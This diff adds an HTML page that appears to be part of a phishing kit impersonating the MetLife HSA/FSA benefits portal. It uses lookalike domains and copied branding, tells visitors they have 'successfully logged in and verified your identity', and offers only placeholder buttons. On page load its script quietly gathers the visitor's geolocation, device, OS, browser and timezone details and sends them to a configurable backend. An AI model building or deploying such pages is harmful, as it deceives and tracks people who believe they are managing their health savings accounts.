@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - MetLife HealthSavingAndSpending Portal</title>
+
+    <!-- Primary Meta Tags -->
+    <meta name="description" content="Access your MetLife dashboard to manage HSA and FSA accounts, view balances, track expenses, file claims, and manage your health savings accounts online.">
+    <meta name="keywords" content="MetLife dashboard, HSA dashboard, FSA dashboard, health savings account management, expense tracking, claims filing">
+    <meta name="author" content="MetLife">
+
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://healthsavingandspending-metlife.com/home">
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Your MetLife HealthSavingAndSpending Dashboard">
+    <meta property="og:description" content="Manage your health savings accounts, view account balances, and access important health account information.">
+    <meta property="og:url" content="https://healthsavingsandspending-metlife.com/home">
+
+    <!-- Additional Meta Tags -->
+    <meta name="language" content="English">
+    <meta name="theme-color" content="#0078b7">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background: #f5f7fa;
+            color: #333;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #0078b7 0%, #005a91 100%);
+            color: white;
+            padding: 20px 0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo-img {
+            height: 50px;
+            width: auto;
+        }
+
+        .user-section {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .user-info {
+            text-align: right;
+        }
+
+        .user-name {
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .user-role {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+
+        .logout-btn {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: 1px solid white;
+            padding: 8px 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.3s;
+        }
+
+        .logout-btn:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 30px 20px;
+        }
+
+        .welcome-section {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .welcome-section h1 {
+            color: #0078b7;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        .welcome-section p {
+            color: #666;
+            line-height: 1.6;
+            font-size: 16px;
+        }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin-top: 30px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 8px;
+            padding: 25px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s, box-shadow 0.3s;
+            cursor: pointer;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
+        }
+
+        .card-icon {
+            font-size: 40px;
+            margin-bottom: 15px;
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #0078b7;
+            margin-bottom: 10px;
+        }
+
+        .card-description {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+
+        .card-button {
+            display: inline-block;
+            background: #0078b7;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 600;
+            transition: background 0.3s;
+            border: none;
+            cursor: pointer;
+        }
+
+        .card-button:hover {
+            background: #005a91;
+        }
+
+        .stats-section {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-top: 30px;
+        }
+
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 32px;
+            font-weight: 700;
+            color: #0078b7;
+        }
+
+        .stat-label {
+            color: #666;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .notification {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            border-left: 4px solid #0078b7;
+            color: #0c5460;
+            padding: 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .notification.warning {
+            background: #fff3cd;
+            border-color: #ffeeba;
+            border-left-color: #ffc107;
+            color: #856404;
+        }
+
+        .footer {
+            background: #f8f9fa;
+            border-top: 1px solid #ddd;
+            padding: 30px 0;
+            margin-top: 50px;
+            text-align: center;
+            color: #666;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+
+            .user-section {
+                justify-content: center;
+            }
+
+            .user-info {
+                text-align: center;
+            }
+
+            .welcome-section h1 {
+                font-size: 22px;
+            }
+
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+    <script src="config.js"></script>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="header-content">
+            <div class="logo-section">
+                <img src="../img/img.jpg" alt="metlife Logo" class="logo-img">
+            </div>
+            <div class="user-section">
+                <div class="user-info">
+                    <div class="user-name" id="displayName">Welcome</div>
+                    <div class="user-role">Participant</div>
+                </div>
+                <button class="logout-btn" onclick="logout()">Logout</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Notifications -->
+        <div id="notificationContainer"></div>
+
+        <!-- Welcome Section -->
+        <div class="welcome-section">
+            <h1>Welcome to metlife Participant Portal</h1>
+            <p>
+                You have successfully logged in and verified your identity. You now have access to manage your benefits,
+                view important information, and utilize our services. Your account is secure and ready to use.
+            </p>
+        </div>
+
+        <!-- Dashboard Cards -->
+        <div class="dashboard-grid">
+            <!-- View Benefits Card -->
+            <div class="card">
+                <div class="card-icon">💰</div>
+                <div class="card-title">View Benefits</div>
+                <div class="card-description">
+                    Check your current benefits, balances, and eligibility status.
+                </div>
+                <button class="card-button" onclick="navigateTo('benefits')">View Benefits</button>
+            </div>
+
+            <!-- File Claim Card -->
+            <div class="card">
+                <div class="card-icon">📝</div>
+                <div class="card-title">File a Claim</div>
+                <div class="card-description">
+                    Submit a new claim for reimbursement or request claim status updates.
+                </div>
+                <button class="card-button" onclick="navigateTo('claims')">File Claim</button>
+            </div>
+
+            <!-- Profile Settings Card -->
+            <div class="card">
+                <div class="card-icon">⚙️</div>
+                <div class="card-title">Profile Settings</div>
+                <div class="card-description">
+                    Update your personal information, email, and contact preferences.
+                </div>
+                <button class="card-button" onclick="navigateTo('settings')">Go to Settings</button>
+            </div>
+
+            <!-- Support Card -->
+            <div class="card">
+                <div class="card-icon">📞</div>
+                <div class="card-title">Contact Support</div>
+                <div class="card-description">
+                    Get help from our customer service team. Available 24/7.
+                </div>
+                <button class="card-button" onclick="contactSupport()">Contact Us</button>
+            </div>
+
+            <!-- Documents Card -->
+            <div class="card">
+                <div class="card-icon">📄</div>
+                <div class="card-title">Documents</div>
+                <div class="card-description">
+                    Access your statements, forms, and other important documents.
+                </div>
+                <button class="card-button" onclick="navigateTo('documents')">View Documents</button>
+            </div>
+
+            <!-- Messages Card -->
+            <div class="card">
+                <div class="card-icon">💬</div>
+                <div class="card-title">Messages</div>
+                <div class="card-description">
+                    Check important notifications and messages from metlife.
+                </div>
+                <button class="card-button" onclick="navigateTo('messages')">View Messages</button>
+            </div>
+        </div>
+
+        <!-- Stats Section -->
+        <div class="stats-section">
+            <div class="stat-card">
+                <div class="stat-number" id="statClaims">3</div>
+                <div class="stat-label">Active Claims</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="statBalance">--</div>
+                <div class="stat-label">Available Balance</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="statMessages">0</div>
+                <div class="stat-label">New Messages</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <div>Contact Us - Contact metlife Customer Service at: (833) 571-0500</div>
+        <div>metlife logo © 2025 MSS, New York, NY 10166 — All Rights Reserved</div>
+        <div>© WEX Health Inc. 2004-2026. All rights reserved. Powered by WEX Health</div>
+    </div>
+
+    <script>
+        // Check if user is authenticated
+        function checkAuthentication() {
+            const token = localStorage.getItem('metlife_token');
+            const username = localStorage.getItem('metlife_username');
+            const verificationComplete = localStorage.getItem('verification_complete');
+
+            if (!token || !username) {
+                alert('You need to login first.');
+                window.location.href = 'index.html';
+                return false;
+            }
+
+            // Display user name
+            document.getElementById('displayName').textContent = username;
+
+            // Log page visit
+            logVisitorInfo();
+
+            return true;
+        }
+
+        // Log visitor information
+        function logVisitorInfo() {
+            // Get browser and device info
+            const userAgent = navigator.userAgent;
+            const language = navigator.language;
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const url = window.location.href;
+            const localTime = new Date().toLocaleString();
+            const utcTime = new Date().toISOString();
+            console.log(`[Visitor Log] URL: ${url}, Local Time: ${localTime}, UTC Time: ${utcTime}`);
+            // Detect OS
+            let os = 'Unknown';
+            if (userAgent.indexOf('Win') > -1) os = 'Windows';
+            else if (userAgent.indexOf('Mac') > -1) os = 'MacOS';
+            else if (userAgent.indexOf('Linux') > -1) os = 'Linux';
+            else if (userAgent.indexOf('Android') > -1) os = 'Android';
+            else if (userAgent.indexOf('iPhone') > -1 || userAgent.indexOf('iPad') > -1) os = 'iOS';
+
+            // Detect Device
+            let device = 'Desktop';
+            if (userAgent.match(/Android|iPhone|iPad|iPod/)) device = 'Mobile';
+
+            // Try to get IP and location info from geolocation API
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        sendVisitorLog({
+                            location: `${latitude}, ${longitude}`,
+                            timezone,
+                            os,
+                            device,
+                            userAgent,
+                            screenResolution,
+                            language,
+                            url,
+                            localTime,
+                        });
+                        console.log(`[Visitor Log] Location: ${latitude}, ${longitude}`);
+                    },
+                    () => {
+                        // If geolocation fails, send without location
+                        sendVisitorLog({
+                            location: 'Not provided',
+                            timezone,
+                            os,
+                            device,
+                            userAgent,
+                            screenResolution,
+                            language,
+                            url,
+                            localTime,
+                        });
+                        console.warn('[Visitor Log] Geolocation permission denied or unavailable.');
+                    }
+                );
+            } else {
+                sendVisitorLog({
+                    location: 'Not provided',
+                    timezone,
+                    os,
+                    device,
+                    userAgent,
+                    screenResolution,
+                    language,
+                    url,
+                    localTime,
+                });
+                console.info('[Visitor Log] Using default location.');
+            }
+        }
+
+        // Send visitor info to backend
+        function sendVisitorLog(data) {
+            fetch(window.metlife_API_BASE + '/api/logs/visitor', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data),
+            })
+            .then(r => r.json())
+            .then(data => {
+                console.log('[Visitor Log]', data);
+            })
+            .catch(err => {
+                console.error('[Visitor Log Error]', err);
+            });
+        }
+
+        // Navigate to different sections (placeholders)
+        function navigateTo(section) {
+            alert(`Navigating to ${section} section...`);
+            // In production, you would navigate to different pages or load content dynamically
+        }
+
+        // Contact support
+        function contactSupport() {
+            alert('📞 Contact metlife Support\n\nPhone: (833) 571-0500\nEmail: support@metlife.com\nHours: 24/7');
+        }
+
+        // Logout function
+        function logout() {
+            if (confirm('Are you sure you want to logout?')) {
+                localStorage.removeItem('metlife_token');
+                localStorage.removeItem('metlife_username');
+                localStorage.removeItem('temp_token');
+                localStorage.removeItem('user_id');
+                localStorage.removeItem('user_email');
+                localStorage.removeItem('verification_complete');
+
+                window.location.href = 'index.html';
+            }
+        }
+
+        // Initialize on page load
+        window.addEventListener('load', () => {
+            checkAuthentication();
+        });
+    </script>
+</body>
+</html>
